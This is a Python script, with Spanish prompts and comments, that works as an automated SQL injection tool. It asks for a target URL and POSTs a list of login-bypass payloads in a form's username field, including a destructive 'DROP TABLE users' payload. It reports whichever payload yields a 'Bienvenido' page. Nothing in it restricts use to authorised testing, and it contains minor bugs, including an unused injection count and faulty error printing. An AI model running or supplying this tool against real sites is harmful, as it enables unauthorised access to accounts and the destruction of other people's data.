import os
import sys
import urllib.parse
import requests
from colorama import Fore, Back, Style

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def sql_injection_main():
    clear_screen()
    banner()
    while True:
        try:
            target_url = input("Ingrese la URL objetivo (o escriba 'n' para salir): ")
            if target_url.lower() == 'n':
                break  # Salir del programa si el usuario escribe 'n'
            elif not target_url.startswith("http://") and not target_url.startswith("https://"):
                raise ValueError(Fore.BLACK + Back.RED + "La URL debe comenzar con 'http://' o 'https://'" + Style.RESET_ALL)

            num_injections = int(input("Ingrese el número de inyecciones de SQL que desea generar: "))

            if num_injections <= 0:
                raise ValueError(Fore.BLACK + Back.RED + "El número de inyecciones debe ser un entero positivo." + Style.RESET_ALL)

            # Lista de payloads para inyección SQL
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1';--",
                "' OR 1=1--",
                "' OR 'x'='x",
                "') OR ('x'='x",
                "'; DROP TABLE users; --"
                # Agregue más payloads según sus necesidades
            ]

            # Construir los datos del formulario
            data = {
                'username': 'test',
                'password': 'test'
            }

            for payload in payloads:
                # Agregar el payload al campo username
                data['username'] = payload

                # Realizar la solicitud HTTP POST
                response = requests.post(target_url, data=data)

                # Analizar la respuesta y determinar si la inyección fue exitosa
                if "Bienvenido" in response.text:
                    print(Fore.BLACK + Back.GREEN + f"Inyección de SQL exitosa con payload: {payload}" + Style.RESET_ALL)
                    break  # Salir del bucle si se encuentra una inyección exitosa
                else:
                    print(Fore.BLACK + Back.RED + f"No se encontraron indicios de inyección de SQL con payload: {payload}" + Style.RESET_ALL)

        except ValueError as ve:
            print(Fore.BLACK + Back.RED + "Error:" + str(ve) + Style.RESET_ALL)
            print(Fore.BLACK + Back.RED + "Inserte datos válidos." + Style.RESET_ALL)
            continue

        except requests.RequestException as re:
            print(Fore.BLACK + Back.RED + "Error de solicitud HTTP:", re + Style.RESET_ALL)
            continue

        except Exception as e:
            clear_screen()
            print(Fore.BLACK + Back.RED + "Error:", e + Style.RESET_ALL)
            continue
    # Mostrar el banner nuevamente al finalizar
    banner()



def banner():
    cartel = r"""
      ___  ___  _      ___        _       _   _         
     / __|/ _ \| |    |_ _|_ _   (_)_____| |_(_)___ _ _   
     \__ \ (_) | |__   | || ' \ / / -_) _|  _| / _ \ ' \ 
     |___/\__\_\____| |___|_||_| /\___\__|\__|_\___/_||_|
                            __/ /
                           |___/                    
    """
    print(Fore.CYAN + Style.BRIGHT + cartel + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + "*********************************************************" + Style.RESET_ALL)

if __name__ == "__main__":
    clear_screen()
    banner()
    sql_injection_main()
